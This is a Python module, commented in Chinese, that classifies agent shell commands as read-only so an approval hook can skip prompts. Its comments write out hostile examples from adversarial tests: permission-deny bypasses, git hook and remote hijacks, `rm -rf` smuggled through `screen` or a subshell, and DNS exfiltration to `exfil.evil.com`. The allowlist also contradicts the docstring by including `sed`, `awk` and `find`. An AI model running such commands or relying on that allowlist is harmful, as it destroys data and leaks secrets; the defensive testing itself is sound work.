"""判一条 shell 命令会不会改东西。

## 为什么要有这个文件

2026-11-03 的真实产品失败：用户问一句「看看我有哪些项目」，收到 **15 张审批卡片**，
全是只读操作（`ls`、`for d in */; do git -C "$d" status; done` 这类）。
用户原话「这个用户体验谁能受得了」。

根因是原来的判据按**整条命令**匹配安全前缀，而且命令里含 `; | & > $(` 任一就
一律不放行。但 agent 为了省轮次，天然会把活写成一条复合命令 —— 每条都触发审批。

## 为什么不能靠 Claude Code 自己的机制

实测（2026-11-03，隔离目录 + 临时 CLAUDE_CONFIG_DIR）：

| 方案 | 复合只读命令 | 写操作 |
|---|---|---|
| 空 allowlist（靠内置启发式） | `&&` 串联放行，但 **for 循环/管道必被问** | `touch` 拦住 ✓ |
| `allow:["Bash"]` | 不问 ✓ | 🔴 `echo X > f` **真写了文件** |
| `allow:["Bash(ls:*)"…]` 窄前缀 | 🔴 必被问 | 拦住 ✓ |
| `--permission-mode auto`（模型分类器） | 不问 ✓ | 🔴 重定向**真写了文件** |
| `auto` + `deny:["Bash(* > *)"]` | 不问 | 🔴 通配**挡不住重定向**，文件还是被写 |

还有一条：**只读白名单基本是废票** —— 空 allowlist 下 `ls`/`git status`/`wc` 本来就自动跑，
那些 `Bash(ls:*)` 条目匹配的是本来不会被问的命令。

所以既有机制里没有「复合只读不问 + 写操作拦住」这个组合。我们有的优势是
**自己的 PreToolUse 钩子**能拿到结构化命令，可以真解析而不是前缀匹配。

## 判据

白名单制，三道硬门先否决，再逐段看首个命令词：

1. **有输出重定向** ⇒ 要问（`>` `>>` `&>`；`2>&1` 不算，它不写文件）
2. **有命令替换** ⇒ 要问（`$(...)`、反引号 —— 静态判不出展开成什么，
   实测 `$(echo rm) -f x` 能绕过 `Bash(rm:*)` 的 deny）
3. **逐段取首个命令词**，按 `; && || | &` 和 `do/then` 切段，跳过 `for VAR in …`
   的变量与列表（它们不是命令）、跳过 `VAR=value` 前缀赋值
4. 每段的命令必须在 **READERS** 白名单里；`git` 另看子命令是否在 **GIT_SAFE**
5. **不认识的命令一律要问** —— 这是白名单制的要点，宁可多问一次

刻意**不**放进 READERS 的（看着像只读其实能写）：
`sed`（`-i` 就地编辑）、`awk`（`print > file`）、`find`（`-delete`/`-exec`）、
`tee`、`xargs`、任何解释器（`python`/`node`/`sh`/`perl`）、`eval`/`exec`。

⚠️ **这一层是降噪，不是安全边界。** 真正的边界是 `claude --allowed-tools` /
`--disallowed-tools`（由 Claude Code 自己的权限层执行，实测挡得住命令延长、
绝对路径绕 deny、以及 Grep/`git diff --no-index` 读被 deny 的路径）。
这里判错成"只读"最坏的后果是少弹一张卡片，底下还有那层兜着。
"""

from __future__ import annotations

import re
import shlex

# 只读命令白名单。加任何一个之前先问：它有没有写文件的开关？
READERS = frozenset(
    {
        "ls", "cat", "head", "tail", "wc", "file", "du", "df", "echo", "printf",
        "pwd", "basename", "dirname", "grep", "egrep", "fgrep", "rg", "sort",
        "uniq", "cut", "tr", "date", "which", "type", "ps", "uname",
        "stat", "realpath", "readlink", "sw_vers", "true", "false", "test", "[",
        "column", "nl", "rev", "comm", "diff", "cmp", "md5", "shasum", "jq",
        # ── 第 16 轮：「只是去看一眼 terminal」也被弹卡（领导原话）──
        # 只读判定是白名单制 ⇒ 不在名单里 = 当成会写。主会话实测 45 条「看一眼」里 34 条被拦。
        # 下面这些**本身没有会写的子命令**（选项层面会写的另外按 _WRITE_FLAG_GATED 挡）：
        "who", "w", "last", "users", "groups",            # 谁登录着（没有会写的子命令）
        "vm_stat",                                        # 看内存
        # 这两个**没有任何写模式**（查过 man）：ioreg 只会 dump，system_profiler 只会报告。
        # 值守担心的是「量大」—— 那是输出体积问题，由回复截断/脱敏那一层管，不该在
        # 「会不会写」这道闸上判成要问（那会把正常的「看一眼硬件」也拦掉）。
        "ioreg", "system_profiler",
        # 🔴 **ifconfig / scutil / dig / host / nslookup / ping / system_profiler / ioreg / nettop
        #    不在这里**：它们都有会写或会滥用的形状，整命令放行就是把那些一起放了。
        #    值守 12:57 抓到 17 条（改机器名、起停 VPN、改网卡、DNS 外发、ping 洪泛）。
        #    它们走下面 `_READONLY_FLAG_ONLY` 那张「整段白名单」表。
        # 🔴 `printenv` 也撤掉：`printenv ANTHROPIC_API_KEY` 能把单个凭据打出来。
        #    裸 `printenv`（整份环境变量）由 `_READONLY_FLAG_ONLY` 放行，带名字的要问。
        # 🔴 `env` **不放**：`env /usr/bin/touch /tmp/x` 实测真建了文件、
        # `env -i /bin/sh -c …` 也跑起来了 —— 它是「拿环境变量跑另一条命令」的包装器，
        # 不是查询命令。我这一轮顺手把它放进来，被 test_cmdclass_adversarial 当场抓住。
        # 想看环境变量用 `printenv`，或 `printenv | grep -i proxy`。
        "read", "echo", "sed", "awk",
        # 无害的 shell 内建/导航。`cd` 尤其重要 —— agent 几乎每条命令都以
        # `cd <workspace> && …` 开头（它要确保在对的目录），不放行等于每条都弹卡片。
        # `cd` 本身只改当前进程的工作目录，不碰文件；真正的边界是后面那段命令，
        # 而后面那段会被逐段检查。
        # 🔴 `command` / `builtin` 是**转发器**：`command rm -rf x` 实测真删了文件
        # （`/usr/bin/command` 真实存在，不只是 shell 内建）。只有带 `-v`/`-V`
        # 时才是"打印这个命令在哪"，那正是 agent 探测工具存不存在的高频写法
        # （`command -v redis-cli >/dev/null && …`）。按选项判，见 `_FORWARDERS`。
        "cd", "pushd", "popd", "dirs", "command", "builtin", "set", "shopt",
        "printenv", "locale", "tty", "groups", "getconf", "arch", "sysctl",
        "yq", "tree", "whoami", "id", "hostname", "sleep", "seq", "expr",
        "pgrep", "vm_stat", "sysctl", "defaults", "find",
        # 2026-11-03 采集（24 个真实问法、haiku、隔离 devbox）掉出来的只读命令。
        # 每一条都先查过有没有写文件的开关、并实测跑一遍对比文件集合（都没动）：
        #   - `uptime`  本机 `uptime --help` 回 "usage: uptime"：**没有任何选项**。
        #   - `vm_stat` 已在表里，和 `uptime` 一起被「系统负载」类问法带出来。
        #   - `lsof`    「哪些端口被占用」必用它。唯一能写的是 `-D b|u <path>`
        #                （device cache 文件），本机 lsof 4.91 实测回
        #                "unsupported option: -D"，但判据不靠"恰好不支持"兜底 ⇒
        #                见 `_WRITE_FLAG_GATED["lsof"]`，`-D` 一律要问。
        #   - `od`      看二进制/查不可见字符（实测 agent 拿它看 Makefile 的 tab）。
        #                全部选项都是输出格式（`-o`/`-x`/`-c`/`-t`），**没有写文件的**；
        #                `-o` 是"按八进制短整型输出"，不是 `sort -o` 那种输出文件。
        #   - `top`     「系统负载」类问法必用。🔴 **裸 `top` 实测 5 秒不退出**
        #                （交互式全屏），会把整轮挂到超时 ⇒ 见 `_HANGS_WITHOUT_FLAG`。
        "uptime", "lsof", "od", "top",
        # 循环里的流程控制。`[ -e "$d/.git" ] || continue` 是 agent 遍历多仓库时
        # 的标准写法 —— 实测 24 个问法里有 5 张卡片就是它（判成「不认识的命令：
        # continue」）。两者都是 shell 内建、只改控制流，不碰文件。
        "continue", "break", "return",
    }
)

# 转发器：它们本身无害，危险全在**它们转发的那条命令**里。
# 只有带"只打印、不执行"的选项时才放行，否则把后面那条命令抽出来递归判。
#
# 🔴 实测（2026-11-03）：`command rm -rf x` 和 `find . -exec command rm {} +`
# 都**真把文件删了** —— `command` 当时在 READERS 里（为了 `command -v redis-cli`
# 这个高频探测写法），于是整条被判成只读。白名单里放一个转发器 = 白名单失效。
_FORWARDERS = {
    # `command -v X` / `-V X` 只打印 X 的路径，不跑它
    "command": re.compile(r"(^|\s)-[pVv]*[Vv][pVv]*(\s|$)"),
    # `builtin` 没有"只打印"的选项 ⇒ 永远要看它转发的那条
    "builtin": None,
}

# 这些命令**不带能让它退出的选项时会挂住**。挂住的后果比弹卡片更糟：
# 整轮跑到 `turn_timeout_sec`（默认 15 分钟）才被杀，用户什么也收不到。
# 实测：裸 `top` 起 5 秒后还活着；`top -l 1 -n 0` 正常退出。
_HANGS_WITHOUT_FLAG = {
    # `-l <次数>`（`-l 1` 和捆绑的 `-l1` 都算）取够样本就退出。
    # 🔴 **`-l 0` 是"无限采样"**，实测 5 秒还活着 ⇒ 不能只认"有个数字"。
    # 所以要求至少一位非零数字（`-l 1`、`-l 10`、`-l 01` 都行，`-l 0`/`-l 00` 不行）。
    # `-h` / `--help` 只打用法，实测也立刻退出。
    "top": re.compile(r"(^|\s)-l\s*0*[1-9]\d*|(^|\s)(-h|--help)\b"),
    # 第 16 轮实测（2026-11-07，逐条跑、7 秒上限）：这几个「看一眼」的流式变体
    # **不带收尾选项就一直刷**，整轮挂到超时为止：
    #   `nettop` 裸跑 HANGS>7s，`nettop -l 1` 0.x 秒出 51KB ⇒ 要求 `-l <非零>`
    #   `vm_stat 1` / `netstat -w 1` / `docker stats` / `traceroute` 同形状，
    #   分别由 `_POLL_INTERVAL_HANGS`、docker 的子命令门、下面的 traceroute 门管。
    # 判据和 `top` 一致：必须带「取够样本就退出」的选项。
    "nettop": re.compile(r"(^|\s)-l\s*0*[1-9]\d*|(^|\s)(-h|--help)\b"),
    # `traceroute` 每跳都等超时，裸跑实测 HANGS>7s（`-m 2` 也没回来）⇒
    # 它没有「快速必退」的选项，一律要问。空正则永不匹配 = 永远落到「会挂住」。
    "traceroute": re.compile(r"(?!)"),
    "traceroute6": re.compile(r"(?!)"),
}

# 🔴 `log` 的子命令表（`SUBCOMMAND_GATED["log"]`）只判「会不会改东西」，
# 漏了「会不会回不来」。实测（2026-11-07，逐条单跑）：
#   `log stream` / `log stream --level info`   30 秒还在刷 —— **设计上永不退出**，
#                                             8 秒就吐了 4.7MB / 6.0MB
#   `log show --pager`（含和 `--last` 同时给） less 等按键，管道和 pty 下都 8 秒 0 字节
#   `log show`（不带任何时间范围）              15 秒还在跑、已吐 1.1GB（整个日志库）
#   `log stats`                               20 秒还在跑
#   `log show --last 5m`                      47 秒退出、65MB ⇒ 这个能退，放行
# 所以 `log show` 必须**带时间范围**（`--last/--start/--end/--predicate/--process`
# 之一）**且不带 `--pager`**；`stream`/`stats` 整个不放。
# 和 `top -l 1` 同一条纪律：放行一个不退出的命令 = 整轮挂到 turn_timeout 才被杀，
# 用户什么都收不到 —— 比弹一张卡片糟得多。
_LOG_BOUNDED = re.compile(r"(^|\s)(--last\b|--start\b|--end\b|--predicate\b|--process\b|--archive\b)")
_LOG_PAGER = re.compile(r"(^|\s)--pager(\s|$)")
_LOG_NEVER_BOUNDED = frozenset({"stream", "stats"})

# `pmset -g <名>`：名字以 `log` 结尾的那几个是**持续输出**，取不到一次就退的值。
# 实测（2026-11-07，7 秒上限）HANGS：`pslog` `rawlog` `assertionslog` `uuidlog`
# `sysloadlog` `thermlog` `powerstatelog`。
# 🔴 不能简单按「名字含 log」判：`-g log`（8.9MB）和 `-g everything`（9.0MB）
# 实测都立刻退出，是正常的「看一眼电源历史」。所以列举这 7 个。
# 另外 19 个取值（`live custom cap sched ups ps therm sysload ac adapter uuid
# history stats systemstate powerstate log everything` 和裸 `-g`、`batt`）全部实测会退。
_PMSET_STREAMING_GETTERS = frozenset(
    {"pslog", "rawlog", "assertionslog", "uuidlog", "sysloadlog", "thermlog",
     "powerstatelog"}
)

# 这些命令**多给一个「秒数」位置参数就变成无限轮询**。实测（2026-11-07）：
#   `vm_stat` 1137B 立刻回；`vm_stat 1` HANGS>7s
#   `netstat -an` 立刻回；`netstat -w 1` / `netstat 1` HANGS>7s
# 不是"会写"，是"会把整轮挂到超时、用户什么都收不到" —— 和 `top` 同一个理由。
# `netstat` 的轮询既能用位置参数也能用 `-w <秒>`，两种都要认。
_POLL_INTERVAL_HANGS = {
    "vm_stat": re.compile(r"(^|\s)\d+(\s|$)"),
    "netstat": re.compile(r"(^|\s)(-w\s*\d+|\d+)(\s|$)"),
}

# 🔴 tmux/screen 的**格式串能跑 shell 命令**：`#(...)` 是 tmux 的 "job" 语法。
# 实测（2026-11-07，tmux 3.6a，隔离 socket `-L` + `-f /dev/null`）：
#   - `display-message -p '#(touch F)'` 和 `list-panes -F '#(touch F)'`
#     重复跑 5 次、间隔 1 秒：输出恒为空、F **没有**被创建
#     （3.6a 在这两个一次性命令里不展开 job）
#   - 但 `set-option -g status-right '#(touch F)'` **真把 F 创建了** ⇒
#     job 机器是真的，只是看展开发生在哪个上下文。
# 判据不靠"这个版本恰好不展开"兜底（和 `lsof -D`、`sysctl -w` 同一条纪律：
# 别的版本/别的机器上编译进去就穿了）⇒ 格式串里出现 `#(` 一律要问。
# `#{pane_current_path}` 这种纯变量展开不受影响，那才是看一眼的高频写法。
_TMUX_FORMAT_RUNS_SHELL = re.compile(r"#\(")

# git 的只读子命令。`defaults` 虽在 READERS 但只有 `read` 子命令安全 —— 见下。
# git 的只读子命令。
#
# 🔴 这个集合被对抗测试打穿过三次，拿掉的都是看着像只读的：
#   - `config`：`git config --global core.hooksPath /tmp/evil` 实测真写进
#     `~/.gitconfig`，之后**任何一次 commit 都会跑攻击者的 pre-commit**；
#     `alias.st '!touch /tmp/x'` 把 payload 藏进别名。静默 + 持久 + 把"要审批的写"
#     转成"下次某个只读 git 命令顺手执行"。
#   - `remote`：`git remote set-url origin https://evil/x` 实测真改掉推送目标 ——
#     用户自己点同意的那次 `git push` 就把代码推给了攻击者，而卡片上只写
#     "git push origin main"。
#   - `stash`：实测把工作区改动还原了，用户感知是"我的未提交改动不见了"。
#   - `branch` / `tag`：带 `-D`/`-d` 能删分支和标签（未合并的提交只剩 reflog）。
#
# 留下来的都是纯查询。带写开关的子命令改成按选项判（见 _GIT_UNSAFE_FLAGS）。
GIT_SAFE = frozenset(
    {
        "status", "log", "diff", "show", "rev-parse", "describe",
        "ls-files", "ls-tree", "blame", "shortlog", "cat-file",
        "symbolic-ref", "count-objects", "whatchanged", "rev-list",
        "name-rev", "merge-base", "for-each-ref", "branch", "tag",
        "remote", "diff-tree", "diff-index", "check-ignore", "var",
        # `config` 曾因为能写 `~/.gitconfig`（`core.hooksPath` / `alias.x '!cmd'`）
        # 被整个拿掉。但「这些提交都是谁提交的」这类问法里 agent 必查
        # `git config --get-all user.email`（实测 2026-11-03 采到 1 张卡）。
        # 🔴 所以**只在带读取开关时**才算只读 —— 见 `_GIT_CONFIG_READ_ONLY`。
        # 裸 `git config x y` / `--add` / `--unset` 照旧弹卡（实测它们真写 config）。
        "config",
    }
)

# `git config` 只有带这些开关之一时才是纯读。实测（2026-11-03）：
#   读：`--get` `--get-all` `--get-regexp` `--list`/`-l` `--get-urlmatch`
#       `--get-colorbool` —— 跑完 `.git/config` 和 `~/.gitconfig` 的 md5 都不变
#   写：裸 `git config user.name EVIL`、`--add`、`--replace-all`、`--unset`
#       —— 四条逐条单跑，每条都真改了 `.git/config`
# 白名单制：认不出开关就当写。`--global`/`--local`/`--show-origin` 只是**选作用域**，
# 不单独构成读 —— `git config --global user.name EVIL` 一样在写。
_GIT_CONFIG_READ_ONLY = re.compile(
    r"(^|\s)(--get\b|--get-all\b|--get-regexp\b|--get-urlmatch\b"
    r"|--get-color\b|--get-colorbool\b|--list\b|-l\b|list(?=\s|$)|get(?=\s|$))"
)
# 这些开关即使和 `--get` 同时出现也必须拦（`--get` 在前不代表没有写）。
_GIT_CONFIG_WRITE = re.compile(
    r"(^|\s)(--add\b|--replace-all\b|--unset\b|--unset-all\b|--edit\b|-e\b"
    r"|--rename-section\b|--remove-section\b"
    r"|(?:set|unset|rename-section|remove-section|edit)(?=\s|$))"
)

# 这些 git 子命令**只有不带写开关时**才是只读。
# ⚠️ `\b` 在连字符前后不成立（`-` 不是单词字符）⇒ `set-url\b` 配不上
# `set-url origin ...`。实测踩过：`git remote set-url origin https://evil/x`
# 当时没被拦住，而它能把用户的代码推给攻击者。
# 所以带连字符的子命令用 `(?=\s|$)` 显式要求后面是空白或结尾。
_GIT_UNSAFE_FLAGS = re.compile(
    r"(^|\s)("
    r"--delete\b|--move\b|--force\b|--edit\b"
    r"|--output[=\s]|--unset\b"
    r"|(?:set-url|set-head|set-branches|add|remove|rename|prune|rm)(?=\s|$)"
    r")"
)

# 单字母写开关（`-d` 删、`-m` 改名、`-f` 强制、`-e` 编辑）**只在这几个子命令上
# 成立**，不能一刀切拦。实测（2026-11-03，逐条跑完比对仓库文件 md5）：
#
#   纯读，被一刀切误拦的：`git ls-files -d`（列已删文件）、`ls-files -m`（列改动）、
#   `diff -M`（检测重命名）、`log -m`、`blame -e`（显邮箱）、`shortlog -e`、
#   `cat-file -e`（判对象存不存在）、`status -M`、`ls-tree -d`、`diff-tree -M`、
#   `check-ignore -n`、`for-each-ref -s` —— 13 条全部没动任何文件。
#   其中 `shortlog -e` / `blame -e` 正是「谁提交的」这类问法的标准写法。
#
#   真能写：`git branch -d <分支>` 实测真把分支删了。
#
# 所以按子命令分。`git branch`/`tag`/`remote` 带这些短开关照旧拦。
_GIT_SHORT_FLAG_WRITERS = frozenset({"branch", "tag", "remote", "symbolic-ref"})
_GIT_UNSAFE_SHORT_FLAGS = re.compile(r"(^|\s)-[dDmMef]\b")

# git 的全局选项里有能执行任意命令的：
#   `git -c diff.external='touch /tmp/p' diff` 实测真执行了
#   `git --exec-path=/evil status`（status 是内置，实测没触发，但同根因）
_GIT_DANGEROUS_GLOBAL = re.compile(r"(^|\s)(-c\s|--exec-path|--config-env)")

# 这些 git 子命令多给一个位置参数就从"查询"变成"创建"。
_GIT_CREATE_BY_POSITIONAL = frozenset({"tag", "branch", "remote"})

# 带这些选项时，后面的位置参数是**过滤模式**不是要创建的名字：
# `git tag -l 'v1*'`、`git branch --list 'feat/*'`、`git branch --contains HEAD`
_GIT_LIST_FLAGS = re.compile(
    r"(^|\s)(-l\b|--list\b|--contains\b|--merged\b|--no-merged\b"
    r"|--points-at\b|--sort[=\s]|-a\b|--all\b|-r\b|--remotes\b|-v\b)"
)

# 这些命令有「只读子命令」和「写子命令」之分，要看第一个非选项参数。
SUBCOMMAND_GATED = {
    "git": GIT_SAFE,
    "defaults": frozenset({"read", "read-type", "domains", "find"}),
    "launchctl": frozenset({"list", "print", "print-disabled", "dumpstate"}),
    "brew": frozenset({"list", "info", "--version", "config", "outdated", "deps"}),
    "npm": frozenset({"ls", "list", "view", "info", "outdated", "--version"}),
    "kubectl": frozenset({"get", "describe", "logs", "top", "version", "explain"}),
    "docker": frozenset({"ps", "images", "logs", "inspect", "version", "info"}),
    # ── 第 16 轮：按子命令精确放行「看一眼」──
    # 🔴 整个命令放行是不行的：tmux 能 send-keys（往终端里敲字）、kill-server、run-shell；
    # screen 能 -X stuff；log 能 erase/config/collect。这些都是写，必须仍要问。
    # 判据只放「取值 / 列清单」那几个子命令，别的一律落到「不在白名单」⇒ 要问。
    # 🔴 `capture-pane` 只在带 `-p`（打到 stdout）时算看一眼：`-b <buf>` 是写进 tmux buffer，
    # 再 `save-buffer` 就落盘。下面单独判（值守抓到 `tmux capture-pane -b mybuf` 被放行）。
    "tmux": frozenset({
        "capture-pane", "list-sessions", "list-panes", "list-windows", "list-clients",
        "list-buffers", "list-keys", "list-commands", "display-message", "show-options",
        "show-environment", "show-messages", "info", "has-session",
        # 常用简写（tmux 自己认）
        "ls", "lsp", "lsw", "showw", "show",
    }),
    # 🔴 `log` 只放 show/stream：`log erase` 清日志、`log config` 改采集级别、`log collect` 打包落盘。
    "log": frozenset({"show", "stream", "stats", "help"}),
    # 🔴 `crontab` 只放 `-l`（下面按选项判，这里给个空集表示「必须有被认可的子命令/选项」）
    # 🔴 pip 只放看的；install/uninstall 会改环境
    # 🔴 `config` 不整个放：`pip config set/unset` 会改 ~/.config/pip/pip.conf
    # （换 pip 源 = 供应链），下面按第二级子命令再判一次。
    "pip": frozenset({"list", "show", "freeze", "--version", "-V", "check", "config"}),
    "pip3": frozenset({"list", "show", "freeze", "--version", "-V", "check", "config"}),
}

# 🔴 第 16 轮：这几个命令**只在带了某个只读选项时**才算看一眼，裸跑或带别的选项都要问。
# 形状和 `SUBCOMMAND_GATED` 相反：那张表看「第一个位置参数」，这张看「有没有这个选项」。
#   pmset -g …        看电源设置；`pmset -a sleep 0` / `pmset sleepnow` 是改设置
#   screen -ls/-list  列会话；`screen -X stuff` 往终端里敲字、`-wipe` 删
#   crontab -l        看定时任务；`crontab -r` 删、`crontab <文件>` 覆盖
#   networksetup -get* 看网络；`-set*` 改网络
#   netstat 默认只读，但 `-I <接口> -d` 这类是清计数
# 🔴 第 16 轮：这几个命令**只在整段都是被认可的只读 token 时**才算看一眼。
#
# 第一版写成「这一段里出现过只读选项就放行」—— 值守当场抓到 11 条「绿着漏」：
#   screen -ls -X stuff 'rm -rf ~'（往终端敲 rm -rf ~）、pmset -g -a sleep 0、
#   crontab -l -r（删全部定时任务）、softwareupdate --list -i -a（真装系统更新会重启）、
#   networksetup -getinfo Wi-Fi -setdnsservers …、tmux capture-pane -b mybuf
# 只读选项后面再挂一个写选项，就全被放行了，而这几个命令**一条都不在** policy 的禁止清单里
# ⇒ 钩子直接 allow、不弹卡就执行。42 条对抗样本和 3085 条测试当时全绿 —— 绿着漏。
#
# 所以改成白名单式：`flags` 里是允许的选项，`values` 说哪些选项后面跟一个值，
# `max_args` 是允许的位置参数个数。**出现任何别的 token 一律判「要问」**。
_READONLY_FLAG_ONLY = {
    # pmset -g [取值名]；`-a/-b/-c sleep 0`、`sleepnow` 都是改设置
    "pmset": {"flags": {"-g"}, "values": set(), "max_args": 1},
    # screen 只许列会话
    "screen": {"flags": {"-ls", "-list"}, "values": set(), "max_args": 0},
    # crontab 只许 -l（-r 删、给文件名 = 覆盖）
    "crontab": {"flags": {"-l"}, "values": set(), "max_args": 0},
    # softwareupdate 只许列（-i/--install 会真装、要重启）
    "softwareupdate": {"flags": {"--list", "-l", "--list-full-installers"},
                       "values": set(), "max_args": 0},
    # networksetup 只许 -get*（-set* 改网络）。-getinfo 后面跟一个服务名
    "networksetup": {"flags": None, "allow_re": re.compile(r"^-get[a-zA-Z]+$"),
                     "values": set(), "max_args": 2},
    # ── 值守 12:57 那 17 条：整命令放行改成整段白名单 ──
    # scutil 只放取值和看 DNS/代理；`--set` 改机器名、`--nc start|stop` 起停 VPN、`--renew` 都是写
    "scutil": {"flags": None,
               "allow_re": re.compile(r"^(--get|--dns|--proxy|--nwi|--nc)$"),
               "values": {"--get"},
               "arg_re": re.compile(r"^(list|status)$"), "max_args": 1},
    # ifconfig 只放「看」：裸跑、-a/-L/-m/-r/-u/-v，或者只给一个接口名
    # （`ifconfig en0 down` / `en0 192.168.1.9` / `lo0 alias …` / `en0 mtu 500` 都是改网卡）
    "ifconfig": {"flags": None, "allow_re": re.compile(r"^-[aLmruv]+$"),
                 "values": set(), "arg_re": re.compile(r"^[a-z]+[0-9]+$"), "max_args": 1},
    # 🔴 `ping` 必须带 `-c <次数>`：裸跑不退（实测 >6 秒还在跑）会把一轮占到超时；
    #    `-f` 是洪泛、`-i` 小间隔、`-s` 大包都是在打网络。
    "ping": {"flags": None, "allow_re": re.compile(r"^-[cnqv]$"),
             "values": {"-c"}, "need": re.compile(r"(^|\s)-c\s+[1-9]"),
             "arg_re": re.compile(r"^[A-Za-z0-9.:-]+$"), "max_args": 1},
    # 🔴 **dig / host / nslookup 一个都不放**（值守 12:57 提的「要么整批不放」，我选整批不放）。
    # 理由：任何一次域名查询本身就是出网 —— 把数据编进域名就送出去了（`dig @服务器`
    # 实测直接出结果、不要 root；`host -t txt` 是经典外带通道；`dig -f 文件` 批量读）。
    # 这和 `curl`/`wget` 被禁是同一个理由，按选项细分是打地鼠：`host example.com` 和
    # `host -t txt exfil.evil.com` 在「会不会把数据送出去」这件事上没有区别。
    # 「看网络」的正当需求由 `scutil --dns`、`ifconfig`、`netstat` 满足，这三个不出网。
    "nettop": {"flags": None, "allow_re": re.compile(r"^-[lLnmkPxtJ]$"),
               "values": {"-l", "-m", "-k", "-t", "-J"},
               "need": re.compile(r"(^|\s)-l\s+[1-9]"), "max_args": 0},
    # 裸 `printenv` 和 `printenv PATH` 可以；`printenv ANTHROPIC_API_KEY` 这种
    # **名字看着就是凭据**的要问（出口还有脱敏兜底，这里是第二道）。
    "printenv": {"flags": set(), "values": set(),
                 "arg_re": re.compile(r"^(?!.*(?i:KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|AUTH))"
                                      r"[A-Za-z_][A-Za-z0-9_]*$"),
                 "max_args": 1},
    # `arp` 只放「列 ARP 表」：`-a` / `-n` / `-i <接口>`。
    # 🔴 不能整条放：man 写明 `-d` 删表项、`-s`/`-S` 写死一条映射（ARP 欺骗的
    # 标准手法：把网关 MAC 指到别处就能截流量）、`-f <文件>` 批量灌。
    # 实测（2026-11-07）`arp -a`/`-an`/`-n -a`/`-i en0 -a` 四种都 63 字节立刻退、
    # 没动任何东西；`arp -d 1.2.3.4` 非 root 回 "cannot locate"（**不靠这个兜底** ——
    # 和 `sysctl -w`、`lsof -D` 同一条纪律：有权限的环境里就真写了）。
    # `arp <主机名>` 单查一台也是只读，所以留一个位置参数。
    "arp": {"flags": None, "allow_re": re.compile(r"^-[aniL]+$"),
            "deny_re": re.compile(r"^-[a-zA-Z]*([dsSf])[a-zA-Z]*$"),
            "values": {"-i"},
            "arg_re": re.compile(r"^[A-Za-z0-9._:-]+$"), "max_args": 1},
    # netstat 默认只读；`-I <接口> -d` 这类是清计数
    "netstat": {"flags": None, "allow_re": re.compile(r"^-[acdefghiIlmnpqrRsStuvwW0-9.]*$"),
                "deny_re": re.compile(r"^-[a-zA-Z]*d[a-zA-Z]*$"),
                "values": {"-I", "-p", "-f"}, "max_args": 1},
}
# shell 的段分隔符：之后的 token 是新的「命令位置」
_SEPARATORS = frozenset({";", "&&", "||", "|", "&", "\n", "\r", "do", "then", "{", "("})

# 🔴 shlex 的 `punctuation_chars` 会把**连在一起的标点合并成一个 token**：
# `(ls); rm -rf DIR` 切出 `);` 而不是 `)` + `;`。`);` 既不在 `_SEPARATORS`
# 也不在 `_STRUCTURE` 里 ⇒ 分号整段消失 ⇒ 第二条命令不在"命令位置"上。
#
# 实测（2026-11-03）：`(ls); rm -rf /tmp/victimdir` 被判成**「全部是只读命令」**，
# 而那条命令**真把目录删了**。同一形状还有 `)&&`、`)|`、`|&`、`);;`。
# 这和文件注释里记着的两次旧事故同根：`2>/dev/null;` 把分号吃掉、
# 行尾注释把换行吃掉 —— 都是"分隔符从命令位置消失"。
#
# 判据：token 整体只由 shell 元字符组成 ⇒ 它是分隔符/结构，不是命令名。
# 引号包起来的单个元字符（`grep ';' f`）分词后长得一样，会被当成分隔符 ⇒
# 多问一次。宁可多问，不可漏放。
_PUNCTUATION_ONLY = re.compile(r"^[();|&<>]+$|^;;$")
# 结构关键字：本身不是命令，跳过
_STRUCTURE = frozenset(
    {"done", "fi", "esac", "}", ")", "!", "[[", "]]", "time", "else", "elif", "in",
     ";;", "(", "|"}
)
_LOOP_HEADS = frozenset({"for", "while", "until", "select"})

# 这些命令的参数里，`( )` 是**它自己的表达式分组**，不是 shell 子 shell。
# 只有 `find` —— 别的命令不要往这里加，加错等于让 `(` 不再是分隔符，
# 子 shell 里的写操作就从"命令位置"消失了。
_EXPRESSION_COMMANDS = frozenset({"find"})

# 带值的选项：判子命令/位置参数时要连它的值一起跳过。
# `git -C webapp branch --show-current` 里的 `webapp` 是 `-C` 的值，不是分支名 ——
# 实测（2026-11-03，haiku，一个问法 8 张卡里 6 张是这一条）agent 查多仓库分支时
# 天然写 `git -C <dir> branch --show-current`，全被判成「在创建分支」而弹卡。
# 🔴 带值选项**按命令区分**，不能用一张全局表。
# `-c` 对 git 是「带值的配置项」（`git -c core.x=y`），但对 `uniq`/`sort`/`wc`
# 是「不带值的开关」（`uniq -c` = 计数）。用全局表会把 `uniq -c a b` 的 `a`
# 当成 `-c` 的值吃掉 ⇒ 只剩 1 个位置参数 ⇒ 漏判成只读，而 `b` 是输出文件。
# 实测踩过：`uniq -c /tmp/a.txt /tmp/pwned` 能真写文件。
_OPTS_WITH_VALUE_BY_CMD = {
    "git": frozenset({"-C", "-c", "--git-dir", "--work-tree", "--exec-path"}),
    "find": frozenset({"-name", "-iname", "-path", "-type", "-maxdepth",
                       "-mindepth", "-newer", "-size", "-perm", "-user"}),
    "grep": frozenset({"-e", "-f", "--include", "--exclude", "-m", "-A", "-B", "-C"}),
    "rg": frozenset({"-e", "-g", "--glob", "-t", "-m", "-A", "-B", "-C"}),
    "sed": frozenset({"-e", "-f"}),
    "awk": frozenset({"-F", "-v", "-f"}),
}
# 兜底：认不出命令时用这组。偏保守 —— 少吃一个参数比多吃一个安全
# （多吃会把输出文件名吃掉 ⇒ 漏判）。
_OPTS_WITH_VALUE_DEFAULT = frozenset({"--file", "--output", "-o"})

# 能安全忽略的前缀赋值。刻意**不**含 PATH / LD_* / DYLD_* / IFS / SHELL ——
# 那些能改变"哪个可执行文件被跑"或"怎么分词"，等于绕过整个白名单。
# 这些变量名能改变"哪个可执行文件被跑"或"怎么分词/加载"，
# 等于绕过整个命令白名单 ⇒ 一律要审批。
# 危险变量名里的例外：**空赋值**。
# `while IFS= read -r f; do …; done` 是读文件逐行的标准写法（agent 高频用它代替
# `for`，因为它能正确处理带空格的文件名）。实测（2026-11-03）24 个问法里
# 有 2 张卡片就是它。
#
# 为什么空 `IFS=` 安全：它**禁用**分词，比默认的 `IFS=$' \t\n'` 更严 ——
# 实测 `V="-o /tmp/out"; printf "[%s]" $V` 默认拆成 `[-o]` `[/tmp/out]` 两个参数，
# 加了 `IFS=` 之后只有一个 `[-o /tmp/out]`。
# 所以它不可能"把一个参数变成两个选项"，而那正是拦 IFS 的理由。
# 只放过**完全空**的值：`IFS=,` / `IFS=x` 会改变怎么拆，照旧要问。
_HARMLESS_ASSIGNMENT = re.compile(r"^IFS=$")

_DANGEROUS_ENV = re.compile(
